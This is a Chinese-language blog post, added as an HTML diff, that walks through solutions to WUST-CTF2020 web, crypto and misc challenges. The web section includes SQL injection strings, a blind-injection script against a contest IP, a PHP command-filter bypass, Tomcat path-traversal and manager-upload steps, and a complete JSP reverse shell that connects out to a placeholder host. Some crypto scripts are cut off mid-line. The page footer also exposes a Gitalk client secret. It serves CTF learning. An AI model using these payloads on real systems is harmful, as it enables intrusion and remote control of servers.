@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>WUST-CTF2020(Web/Misc/Crypto) |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="WUST-CTF2020(Web/Misc/Crypto) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="WUST-CTF2020(Web/Misc/Crypto)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/drd8ISfKe/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>WUST-CTF2020(Web/Misc/Crypto)</h1>
+            <span class="meta">
+            	Posted on
+              2020-03-29，9 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>终于AK了一次WEB~~~~~😃</p>
+<!-- more -->
+<center>Web</center>
+<p><strong>checkin</strong><br>
+要求我们输入作者。修改HTML。<br>
+<img src="https://guokeya.github.io/post-images/1585487565691.png" alt="" loading="lazy"><br>
+得到<code>一个远古的博客: https://52hertz.tech</code><br>
+在首页得到了<code>wctf2020{can_y0u_can_a_can_a</code>貌似不太完整的样子。。继续找找<br>
+在最后面有一篇名为远古的Blog得到另一半flag<code>5_a_c@nner_can_Can_@_can}</code></p>
+<p><strong>admin</strong><br>
+看到登陆框。万能密码试下<code>' or 1=1#</code><br>
+<img src="https://guokeya.github.io/post-images/1585487930505.png" alt="" loading="lazy"><br>
+跳转到了adddddddddddddddddddddddminnnnnnnnnnnnnnnnnnnnnn.php<br>
+要求本地访问-&gt;get ais=520-&gt;post wust=1314<br>
+<img src="https://guokeya.github.io/post-images/1585488181727.png" alt="" loading="lazy"><br>
+得到<code>https://www.52hertz.tech/</code><br>
+解码得到Flag<br>
+<img src="https://guokeya.github.io/post-images/1585488300460.png" alt="" loading="lazy"></p>
+<p><strong>CV Maker</strong><br>
+这题比完赛后。貌似崩了。说一下思路挺简单的<br>
+注册账号。修改头像的地方。上传php。然后访问执行/readflag就行</p>
+<p><strong>朴实无华</strong><br>
+访问robots.txt得到fAke_f1agggg.php<br>
+在head中发现fl4g.php<br>
+得到源码</p>
+<pre><code>&lt;?php
+header('Content-type:text/html;charset=utf-8');
+error_reporting(0);
+highlight_file(__file__);
+
+
+//level 1
+if (isset($_GET['num'])){
+    $num = $_GET['num'];
+    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){
+        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;
+    }else{
+        die(&quot;金钱解决不了穷人的本质问题&quot;);
+    }
+}else{
+    die(&quot;去非洲吧&quot;);
+}
+//level 2
+if (isset($_GET['md5'])){
+   $md5=$_GET['md5'];
+   if ($md5==md5($md5))
+       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;
+   else
+       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);
+}else{
+    die(&quot;去非洲吧&quot;);
+}
+
+//get flag
+if (isset($_GET['get_flag'])){
+    $get_flag = $_GET['get_flag'];
+    if(!strstr($get_flag,&quot; &quot;)){
+        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);
+        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;
+        system($get_flag);
+    }else{
+        die(&quot;快到非洲了&quot;);
+    }
+}else{
+    die(&quot;去非洲吧&quot;);
+}
+?&gt;
+</code></pre>
+<p>第一层：<br>
+<code>if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</code><br>
+20.20e8即可。intval会识别为20<br>
+而+1会将20.20e8变成普通的数字然后再+1<br>
+第二层:<br>
+<code>$md5==md5($md5)</code><br>
+符合条件的值在第一次MD5加密后。得是0e数字数字数字。然后将结果再次md5解密。还得是0e数字数字<br>
+无脑for循环一直跑<br>
+这里给出一个值<code>00e13060139</code><br>
+第三层：<br>
+不能cat。不能空格。随便绕。<br>
+<img src="https://guokeya.github.io/post-images/1585489641848.png" alt="" loading="lazy"></p>
+<p><strong>easyweb</strong><br>
+tomcat最近的幽灵猫漏洞<br>
+可以文件包含和文件读取<br>
+网上找了好久。都是文件读取。没RCE的脚本。。<br>
+用<code>https://blog.csdn.net/sun1318578251/article/details/104433346/</code>这里的脚本<br>
+首先准备一个jpg。里面是jsp反弹shell的代码</p>
+<pre><code>&lt;%@page import=&quot;java.lang.*&quot;%&gt;
+&lt;%@page import=&quot;java.util.*&quot;%&gt;
+&lt;%@page import=&quot;java.io.*&quot;%&gt;
+&lt;%@page import=&quot;java.net.*&quot;%&gt;
+
+&lt;%
+  class StreamConnector extends Thread
+  {
+    InputStream pp;
+    OutputStream qk;
+
+    StreamConnector( InputStream pp, OutputStream qk )
+    {
+      this.pp = pp;
+      this.qk = qk;
+    }
+
+    public void run()
+    {
+      BufferedReader qe  = null;
+      BufferedWriter ihb = null;
+      try
+      {
+        qe  = new BufferedReader( new InputStreamReader( this.pp ) );
+        ihb = new BufferedWriter( new OutputStreamWriter( this.qk ) );
+        char buffer[] = new char[8192];
+        int length;
+        while( ( length = qe.read( buffer, 0, buffer.length ) ) &gt; 0 )
+        {
+          ihb.write( buffer, 0, length );
+          ihb.flush();
+        }
+      } catch( Exception e ){}
+      try
+      {
+        if( qe != null )
+          qe.close();
+        if( ihb != null )
+          ihb.close();
+      } catch( Exception e ){}
+    }
+  }
+
+  try
+  {
+    String ShellPath;
+if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) {
+  ShellPath = new String(&quot;/bin/sh&quot;);
+} else {
+  ShellPath = new String(&quot;cmd.exe&quot;);
+}
+
+    Socket socket = new Socket( &quot;IP&quot;, 6666 );
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+  } catch( Exception e ) {}
+%&gt;
+</code></pre>
+<p>上传后得到文件名<br>
+<img src="https://guokeya.github.io/post-images/1585490634220.png" alt="" loading="lazy"><br>
+环境有问题。。执行完一次就会连接重置。再也连不上。。这里就不演示了。</p>
+<p><strong>颜值成绩查询</strong><br>
+感觉是sql注入<br>
+<img src="https://guokeya.github.io/post-images/1585491011128.png" alt="" loading="lazy"><br>
+fuzz一下发现。不能带and union这些常见字符。select都可以</p>
+<pre><code>import requests
+url='http://101.200.53.102:10114/?stunum=100||'
+for a in range(1,100):
+    for b in range(30,130):
+        payload='(ascii(substr((select/**/group_concat(flag,0x7e,value)/**/from/**/flag),'+str(a)+',1))='+str(b)+')'
+        r=requests.get(url+payload).text
+        if 'Hi admin, your score is: 100' in r:
+            print(chr(b))
+            break
+</code></pre>
+<p>后来有师傅说。这题将union置空。并不是正则匹配。<br>
+可以直接union双写绕过<br>
+<img src="https://guokeya.github.io/post-images/1585491388215.png" alt="" loading="lazy"></p>
+<p><strong>train yourself to be godly</strong><br>
+肝了好久。终于在最后10分钟成功拿到1血<br>
+首先用了2018年的一个破坏解析器逻辑-取消路径规范化漏洞<br>
+具体文档<code>https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</code><br>
+可以通过<code>..;/</code>访问到webapps目录<br>
+<img src="https://guokeya.github.io/post-images/1585491640211.png" alt="" loading="lazy"><br>
+tomcat/tomcat弱口令进入manager<br>
+注意。这里拦截返回包。将path修改为<code>/..;/</code>。由于我们是通过目录穿越访问的。所有操作都是在<code>/..;/</code>上<br>
+这里有三个注意点。得修改请求路径。它默认会加上example<br>
+第二。得加上HTTP认证头。不然会401<br>
+第三。加上session。<br>
+<img src="https://guokeya.github.io/post-images/1585491888208.png" alt="" loading="lazy"><br>
+成功上传<br>
+<img src="https://guokeya.github.io/post-images/1585492091009.png" alt="" loading="lazy"><br>
+拿flag<br>
+<img src="https://guokeya.github.io/post-images/1585492154264.png" alt="" loading="lazy"></p>
+<center>Crypto</center>
+<p><strong>大数运算</strong><br>
+直接在python下运行。python自带高精度。。</p>
+<p><strong>babyrsa</strong></p>
+<pre><code>import gmpy2
+import math
+n=int(73069886771625642807435783661014062604264768481735145873508846925735521695159)
+e=gmpy2.mpz(int(65537))
+p=189239861511125143212536989589123569301
+q=386123125371923651191219869811293586459
+phi_n=(p-1)*(q-1)
+d=gmpy2.invert(e, phi_n)
+c=28767758880940662779934612526152562406674613203406706867456395986985664083182
+print(hex(pow(c,d,n))[2:-1
+</code></pre>
+<p>脚本一套就行</p>
+<p><strong>佛说：只能四天</strong><br>
+第一层新与佛论禅得到</p>
+<pre><code>平等文明自由友善公正自由诚信富强自由自由平等民主平等自由自由友善敬业平等公正平等富强平等自由平等民主和谐公正自由诚信平等和谐公正公正自由法治平等法治法治法治和谐和谐平等自由和谐自由自由和谐公正自由敬业自由文明和谐平等自由文明和谐平等和谐文明自由和谐自由和谐和谐平等和谐法治公正诚信平等公正诚信民主自由和谐公正民主平等平等平等平等自由和谐和谐和谐平等和谐自由诚信平等和谐自由自由友善敬业平等和谐自由友善敬业平等法治自由法治和谐和谐自由友善公正法治敬业公正友善爱国公正民主法治文明自由民主平等公正自由法治平等文明平等友善自由平等和谐自由友善自由平等文明自由民主自由平等平等敬业自由平等平等诚信富强平等友善敬业公正诚信平等公正友善敬业公正平等平等诚信平等公正自由公正诚信平等法治敬业公正诚信平等法治平等公正友善平等公正诚信自由公正友善敬业法治法治公正公正公正平等公正诚信自由公正和谐公正平等
+</code></pre>
+<p>第二层核心价值观编码得到</p>
+<pre><code>RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence
+</code></pre>
+<p>第三层栅栏密码。将doyouknowfence删掉。然后栅栏</p>
+<pre><code>R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar_
+</code></pre>
+<p>第四层凯撒密码去掉_doyouknowCaesar_。然后凯撒。base32一个个试</p>
+<p><strong>leak</strong></p>
+<pre><code>import gmpy2
+import libnum
+from Crypto.Util.number import long_to_bytes
+
+
+
+
+e = 65537
+n = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847
+dp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825
+c = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869
+for i in range(1, 65538):
+    if (dp * e - 1) % i == 0:
+        if n % (((dp * e - 1) / i) + 1) == 0:
+            p = ((dp * e - 1) / i) + 1
+            q = n / (((dp * e - 1) / i) + 1)
+            phi = (p - 1) * (q - 1)
+            d = gmpy2.invert(e, phi) % phi
+            m = pow(c, d, n)
+            print long_to_bytes(
+</code></pre>
+<center>Misc</center>
+<p><strong>Space Club</strong><br>
+短的换成0。长的换成1<br>
+然后二进制转字符。</p>
+<p><strong>Welcome</strong><br>
+是个人脸识别的框架。找TFBOYS。识别一下得到Flag</p>
+<p><strong>爬</strong><br>
+用PDF编辑器。把图片移开。得到FLAG的十六进制</p>
+<p><strong>Find me</strong><br>
+盲文解密下得到Flag</p>
+<p><strong>girlfriend</strong><br>
+dtmf读出<code>999*666*88*2*777*33*6*999*4*444*777*555*333*777*444*33*66*3*7777</code><br>
+手机九键得到Flag</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/dYX5OTKjq/">
+              <span class="post-title">
+                MRCTF(Web+Misc+Crypto)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
